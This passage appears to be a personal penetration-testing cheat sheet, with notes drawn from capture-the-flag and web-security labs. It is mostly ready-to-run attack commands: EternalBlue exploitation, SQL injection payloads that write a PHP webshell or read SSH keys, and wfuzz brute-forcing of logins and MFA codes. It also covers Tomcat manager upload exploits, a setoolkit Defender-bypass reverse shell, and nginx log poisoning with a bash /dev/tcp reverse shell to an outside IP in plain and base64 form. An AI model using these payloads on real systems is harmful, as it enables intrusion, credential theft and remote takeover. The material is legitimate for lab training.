- users:
```sh
msf> use auxlliary/scanner/smb/smb_enumusers
msf> set RHOSTS <target>
$ enum4linux -U <target>
$ enum4linux -a <target> (everything)
```
- get share list:
```
$ smbclient -L <target>
$ smbclient -L <target> -U <user>
$ enum4linux -S <target>
```
- Connect:
```sh
$ smbclient //<target>/<share>
$ smbclient \\\\<target>\\<share>
$ smbclient \\\\<target>\\<share -D '/path/to/dir' 
```
- Download/Read:
```sh
$ smbclient //<target>/<share> -U <user>
smb> get <file> - #(read a file)
smb> get "<file>" #(download)
```
- Download recursive:
```sh
smbclient '\\server\share'
mask ""
recurse ON
prompt OFF
cd 'path\to\remote\dir'
lcd '~/path/to/download/to/'
mget *
```
- Download recursive with smbget:
```sh
smbget -R smb://<target>/share
```
- Eternalblue scan:
```sh
nmap --script vuln -p445 <target>

msf> search ms17-010
msf> use auxiliary/scanner/smb/smb_ms17_010
msf> use exploit/windows/smb/ms17_010_eternalblue

https://github.com/3ndG4me/AutoBlue-MS17-010
$ python eternal_checker.py
$ cd shellcode; ./shell_prep.sh
$ cd ..; ./listener_prep.sh
$ python eternalblue_exploit7.py <target> shellcode/sc_all.bin
```
- impacket smbclient:
```sh
./smbclient.py user:password@<target>
```

### `SMTP`

`swaks`: https://linux.die.net/man/1/swaks
- the Swiss Army Knife SMTP all-purpose smtp transaction tester 
- used to deliver the malicious file
```sh
$ swaks --to nico@megabank.com --server 10.10.10.77 --attach /root/.msf4/local/shell.rtf
```

`SMTP enum`:
```sh
telnet <address> 110
user <username>
pass <password>
retr 1
retr 2
```

`SMTP enum 2`:
```sh
telnet <address> 25
HELO anything here
VRFY nico@megabank.com
MAIL From: <email>
RCPT To: <email>
QUIT
```

`Python SMTP module`

```sh
$ python -m smtpd -c DebuggingServer 10.10.14.30:25
```
```python
import smtpd
import asyncore
server = smtpd.DebuggingServer(('0.0.0.0',25),None)
asyncore.loop()
```

### `Serpico`
[Serpico](https://github.com/SerpicoProject/Serpico) (reporting tool):
	
### `SNMP`

```sh
nmap -sU --min-rate=5000 -T4 <target>
snmpwalk -c public -v 1 <target>
snmpwalk -Os -c public -v 2c <target> .1.3.6.1.2.1.47.1.1.1
snmp-check -v2c -c public <taget>
```
snmp OIDs:

```
IP Addresses 1.3.6.1.2.1.4.34.1.3
Running Processes 1.3.6.1.2.1.25.4.2.1.2
System Information 1.3.6.1.2.1.1.1
Hostname 1.3.6.1.2.1.1.5
Uptime 1.3.6.1.2.1.1.3
Mountpoints 1.3.6.1.2.1.25.2.3.1.3
Running Software Paths 1.3.6.1.2.1.25.4.2.1.4
Running Software Parameters 1.3.6.1.2.1.25.4.2.1.5
Listening UDP Ports 1.3.6.1.2.1.7.5.1.2.0.0.0.0
Listening TCP Ports 1.3.6.1.2.1.6.13.1.3.0.0.0.0
Network Information 1.3.6.1.2.1.4.20.1
```

`Social Engineering Toolkit`
setoolkit windows defender bypass:
```
setoolkit > 1 > 9 > 2 . (reverse shell payload)
```

### `SQLi`

`SQLi postgres`
```
"', null);DROP TABLE IF EXISTS output; CREATE TABLE output(t TEXT); COPY output FROM PROGRAM \$$ /tmp/shell.sh \$$;-- "
```

`SQLi Manual` (mysql/mariadb, htb jarvis, unattended) https://resources.infosecinstitute.com/tutorial-on-sqli-labs/#gref

Manual Filter e.g. : union and UNION , but not uniOn

```	
' or 1=1 --
' or 1=1 -- -
' or 1=1#
```
```
' UNION SELECT 1,2,3,4#				(enumerate columns)
int=-1 union select 1,2,3,4 -- -		(for integer vulnerable parameters)
order by 4					(same as above)
```
```
' UNION SELECT null,null,null,@@version#	(version info: e.g. ubuntu 14.04)
```
all databases:
```
id=1+UNION+SELECT+1,2,3,4,group_concat(schema_name)+FROM information_schema.schemata+
```
database name:
```
' UNION SELECT null,null,null,database()#
```
user:
```
' UNION SELECT null,null,null,user()#		(user: e.g. root@localhost)
```
table name:
```
' UNION ALL SELECT null,null,null, table_name FROM information_schema.tables #
'+UNION+select+1,2,TABLE_SCHEMA,4,5+FROM+INFORMATION_SCHEMA.COLUMNS;+--+-
id=1+UNION+SELECT+null,null,null,null,group_concat(table_name)+FROM+INFORMATION_SCHEMA.COLUMNS+
```
columns:
```
' UNION ALL SELECT null,null,null, column_name FROM information_schema.columns where table_name='users' #
' UNION ALL SELECT null,null,null, column_name FROM information_schema.columns where table_name='users' LIMIT 1 OFFSET 3 # (when limited no of output) or
' UNION ALL SELECT null,null,null, group_concat(column_name) FROM information_schema.columns where table_name='users' # 
```
```
' union all select null,null,username,password from users #
' union all select null,null,null, load_file("/etc/passwd") # 	(view /etc/passwd)	
' union all select 1,"test",3,4 into outfile '/tmp/test.txt' # 	(write a test file)
' union select 1,'<?php system($_REQUEST["exec"]);?>',3,4 into outfile '/var/www/html/pwned.php' -- - (webshell)
curl -X POST http://<target>/pwned.php (--data-urlencode) exec=whoami
```

`SQLmap`
SQLmap (get)
```sh
sqlmap -u "http://<target>link.php?VarName1=UserInput&VarName2=UserInput&SubmitName=SubmitValue"  --dbs
```
SQLi WAF bypass with delay:
```sh
sqlmap -r app.request --delay=1 --batch --dump
```
SQLmap (post)
```sh
sqlmap -u "http://<target>/link.php" --data="VarName1=UserInput&VarName2=UserInput&SubmitName=SubmitValue" --banner
sqlmap -u "http://<target>/link.php" -data="VarName1=UserInput&VarName2=UserInput&SubmitName=SubmitValue" --dbms
sqlmap -u "http://<target>/link.php" -data="VarName1=UserInput&VarName2=UserInput&SubmitName=SubmitValue" --dbs
sqlmap -u "http://<target>/link.php" --data="VarName1=UserInput&VarName2=UserInput&SubmitName=SubmitValue" --dbms=<dbms> -D <database> --tables
sqlmap -u "http://<target>/link.php" --data="VarName1=UserInput&VarName2=UserInput&SubmitName=SubmitValue" --dbms=<dbms> -D <database>  -T <table> --columns
sqlmap -u "http://<target>/link.php" --data="VarName1=UserInput&VarName2=UserInput&SubmitName=SubmitValue" --dbms=<dbms> -D <database>  -T <table> -C <column1>,<column2> --dump
```
SQLmap request (aggressive):
```sh
sqlmap -r sqlmap.req --level=5 --risk=3 --dump-all
sqlmap -u http://<target>/login.php --forms --level 5 --risk 3 --string "Wrong identification" --dbs --batch
sqlmap -u "http://target" --forms --crawl=2 -D <database> --dump --batch
```
SQLmap (Rest API)
```
sqlmap --url=http://10.10.10.96/users/*
sqlmap --sql-shell --url=http://10.10.10.96/users/*
```
```
sql-shell> SELECT hex(load_file('home/user/.ssh/id_rsa')) 
```

`Staged vs stageless handlers` : https://buffered.io/posts/staged-vs-stageless-handlers/

### `Temp Email`
https://temp-mail.org


### `Vault ssh otp`

```
vault ssh -mode=otp -role=root_otp root@<target>
```

### `VNC`

Allows one to view and operate the console of another computer remotely accross the network.

```sh
vncviewer <target>::<port>
vncviewer -passwd file <target>::<port>
```

VNC register password decrypt: https://github.com/frizb/PasswordDecrypts

### `VPN`

```sh
$ ike-scan <target> -M
```
Strongswan configuration
1. /etc/ipsec.conf:

```sh
config setup

conn %default
		inactivity=1h 	( timeout interval, after which a CHILD_SA is closed if it did not send or receive any traffic.)
		keyexchange=ikev1
		ike=3des-sha1-modp1024   ( cipher suite that we want to use.)
		esp=3des-sha1
		authby=secret

conn <name>
		left=<me>
		right=<target>
		type=transport	(specifies the type of connection we want to establish)
		auto=add/route
		rightprotoport=tcp
```

2. /etc/ipsec.secrets

```
: PSK "pre shared key secret"
```

3. ipsec start

4. ipsec up <name>

### `Webshells`
```
/usr/share/webshells
```
asp webshell: https://raw.githubusercontent.com/tennc/webshell/master/asp/webshell.asp

### `Wfuzz` 
POST & GET (FUZZ keyword)

-hw (wide answers based on word length)
```sh
$ wfuzz -w wordlist.txt -L 20 -d "username=alex&password=FUZZ" http://<target>/login.php
$ wfuzz -w wordlist.txt -L  http//<target>/login.php?username=<user>\&password=FUZZ
```
-hh: hide responses with content-length number
```sh
$ wfuzz -w /usr/share/wordlists/dirb/common.txt -u http://<target>/sync?FUZZ=ls -c --hh 19
$ wfuzz -u http://<target>/path/FUZZ -w /usr/share/dirb/wordlists/common.txt
```
WFUZZ Brute force a cookie: (--hw: hide words)
```sh
$ wfuzz -c --hw=<words> -w /usr/share/SecLists/Passwords/darkweb2017-top1000.txt-H "Cookie: <cookie_name>=FUZZ" http://<target>:<port>
```
-brute force a port (ssrf example):
```sh
$ wfuzz -z range,1-65535 --hl=<lines> http://target:port/url.php?path=127.0.0.1:FUZZ
```
-fuzz parameter name:
```sh
wfuzz -w wordlist -t 100 -hh 0 -u 'http://<target>/url.php?FUZZ=id'
```

Brute force IP address:
```sh
$ wfuzz -z range,1-255 -H "Accept-Encoding: gzip, deflate" -H "Cookie: session=BnIYqWGltTMpAc9RU3T99zOyFxRPASwm" -d "stockApi=http://192.168.0.FUZZ:8080/admin/delete?username=carlos" -H "Content-Type: application/x-www-form-urlencoded" -H "Origin: https://ac961f0c1e74e51680ea126900700021.web-security-academy.net" -H "Accept: */*" -u "https://ac961f0c1e74e51680ea126900700021.web-security-academy.net/product/stock"
```
Dictionary (user/pass):
```sh
$ wfuzz -w ./users.txt -H "Accept-Encoding: gzip, deflate" -H "Cookie: session=tledxrim98DjS8w5WgMv0R3bz2wScTIf" -d "csrf=6Y4VFL24lIVtuWBCIKOpipX1TeFeB6VN&username=FUZZ&password=test" -u "https://ac131f261e6c54b3803fa2ef005a0044.web-security-academy.net/login"

$ wfuzz -w ./pass.txt -H "Accept-Encoding: gzip, deflate" -H "Cookie: session=tledxrim98DjS8w5WgMv0R3bz2wScTIf" -d "csrf=6Y4VFL24lIVtuWBCIKOpipX1TeFeB6VN&username=as&password=FUZZ" -u "https://ac131f261e6c54b3803fa2ef005a0044.web-security-academy.net/login"
```
Match content:
```sh
wfuzz -w ./users.txt -H "Cookie: session=hvwg8vXtldI44WS4PHjGqyr7bjxKTEqM" -d "csrf=TqhmJXiWd0kTvVGoF6IFccYSzd0OQLdW&username=FUZZ&password=test" -u "https://aceb1f9f1f7363ef808ac3ec00610072.web-security-academy.net/login" --hs ">Invalid username or password\.</p>"
```
Brute force MFA:
```sh
$ wfuzz -z range,0000-9999 -H "Cookie: verify=carlos; session=Jje3Zd8IE1OVDHyLaR1ep6Q7KNPstkG1" -d "csrf=8XOszXbGpRqBxVo0wrzZ5WjVXjx8b1Mk&mfa-code=FUZZ" -u "https://ac661fef1e757e9c80675c9500f500de.web-security-academy.net/login2" --hc 200
```
Exclude number of characters:
```sh
$ wfuzz -z range,1-1000 -H "Cookie: id=eccbc87e4b5ce2fe28308fd9f2a7baf3" -u "http://34.94.3.143/de09b8f52a/index.php?page=view.php&id=FUZZ" --hh 1311
```
		
Fuzz with CSRF Token: htb Wall machine

### `Wordlists`

kali: `/usr/share/wordlists`
https://github.com/danielmiessler/SecLists.git
https://labs.nettitude.com/blog/rocktastic/

Wordlist generation:
```sh
$ cewl <target> > wordlist.txt
$ crunch #(generate based on charset, min, max number of chars)
$ crunch <min-chars> <max-chars> <charset> -o output.txt
$ crunch 15 15 -t Th4C00lTheacha^ -o pass.txt
-t (literal)
	@: lower
	,: upper
	%: numbers
	^: symbols
```

### `Web Servers`

`Tomcat manager` metasploit:
```sh
msf > use exploit/multi/http/tomcat_mgr_upload
msf exploit(multi/http/tomcat_mgr_upload) > set rhost target
msf exploit(multi/http/tomcat_mgr_upload) > set rport 8080
msf exploit(multi/http/tomcat_mgr_upload) > set httpusername admin
msf exploit(multi/http/tomcat_mgr_upload) > set httppassword admin
msf exploit(multi/http/tomcat_mgr_upload) > exploit
```

Tomcat manager no metasploit: https://www.embeddedhacker.com/2019/09/hacking-walkthrough-thm-toolsrus/

`Nginx` alias traversal (htb unattended):

https://github.com/yandex/gixy/blob/master/docs/en/plugins/aliastraversal.md
	test:

```
alias../ => HTTP status code 403
alias.../ => HTTP status code 404
alias../../ => HTTP status code 403
alias../../../../../../../../../../../ => HTTP status code 400
```

nginx log file poisoning (LFI required):
1. /var/log/nginx/access.log
- intercept union sqli with burp
- change user-agent to: User-Agent: <?php system('whoami'); ?>
- avoid bad characters:
```	
a. echo -n 'bash -i >& /dev/tcp/10.10.16.32/4444 0>&1 &' | base64
b. <?php system( 'echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4zMC80NDMgMD4mMSAm| base64 -d | bash ' ); ?>
```
2. /var/lib/php/sessions/sess_<PHPSESSID>
```
Cookie: PHPSESSID=ep2cn0dtj0tkaa0spg7n0af087; PWN= <?php system( 'whoami' ) ?>
```	
Make sure there’s no ‘;’ in the payload as it might break the cookie.

php windows, avoid bad characters:
```
echo whoami | iconv -t utf-16le | base64 (windows default locale:utf-16le)
<?='powershell /enc dwBoAG8AYQBtAGkACgA='?>
```



### `Verb tampering`
https://www.imperva.com/learn/application-security/http-verb-tampering/

`WAV` files:
```sh
$ apt-get install sox #(play commnand)
$ apt-get install festival #(text2wave)
$ echo "Hello World" | text2wave -o test.wav
$ play test.wav
```
Speech recognition:
https://support.microsoft.com/en-in/help/12427/windows-speech-recognition-commands

```sh
$ echo "Hello World open single quote" | text2wave -o test.wav (hello world')
$ echo "Hello World open single quote pound sign" | text2wave -o test.wav (hello world'#)
```

`Webhook`: https://webhook.site

### `Wordpress`

- 404 template change:
	- Appearance -> Editor
		- http://<address>/wp-admin/theme-editor.php?file=404.php&theme=<theme>
	- Browse to php:
		- http://<address>/wp-content/themes/<theme>/404.php

- Wordpress aggressive scan (most likely to find vulnerable plugins etc.)
```sh
$ wpscan --url http://<target>/wp/ enumerate p --wp-content-dir wp-content --wp-plugins-dir wp-content/plugins --random-user-agent --stealthy --force --plugins-detection aggressive
```
- wordpress: enumerate plugins, themes, users, disable ssl cert check
```sh
$ wpscan --url https://domain/ --disable-tls-checks --enumerate p --enumerate t --enumerate u
$ wpscan –-url http://<target> --usernames <username> --passwords <wordlist>
```
- wpscan api-token: https://wpscan.com
```sh
$ wpscan --url <target> -v -o wpscan.out --force --api-token <token> -e --plugins-detection mixed
```	
wordpress database user and password configuration:
```sh
/var/www/html/wordpress-<version>/wp-config
```
wordpress login:
```
http://<target>/wp-login.php
```
wordpress plugin location:
```sh
http://<target>/wp-content/plugins/<plugin-name>
```
wordpress theme location:
```sh
http://<target>/wp-content/themes/<theme-header>/<template>.php
```

XSS payload example: htb bankrobber


### `vhd files`
https://medium.com/@klockw3rk/mounting-vhd-file-on-kali-linux-through-remote-share-f2f9542c1f25
